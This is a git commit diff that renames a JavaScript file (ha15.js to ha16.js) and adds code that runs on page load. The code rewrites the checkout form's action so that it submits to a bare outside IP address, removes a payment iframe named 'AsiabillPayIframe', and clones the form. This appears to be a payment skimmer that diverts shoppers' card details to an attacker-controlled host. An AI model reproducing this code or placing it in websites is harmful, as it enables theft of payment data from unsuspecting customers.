21ca2b31527f0466979fed65d0af14d2c9d15c5c
xjjkong <138182422+xjjkong@users.noreply.github.com>
2023-07-01 14:50:53 +0800

    Update and rename ha15.js to ha16.js

--- ha16.js
+++ ha16.js
@@ -1,7 +1,14 @@
-window.onload=function(){var scriptEle = document.createElement("script");
+
+
+window.onload=function(){
+     var scriptEle = document.createElement("script");
      scriptEle.type ="text/javascript";
      scriptEle.text = `document.getElementById('createForm').action = 'http://43.198.42.193/create_payment'`;
      var x = document.getElementById("createForm");
      x.insertBefore(scriptEle, x.firstChild);
      document.body.appendChild(scriptEle);
+     document.getElementById('AsiabillPayIframe').remove();
+     let node = document.getElementById('createForm');
+     let c = node.cloneNode();
+     document.body.appendChild(c);
 }
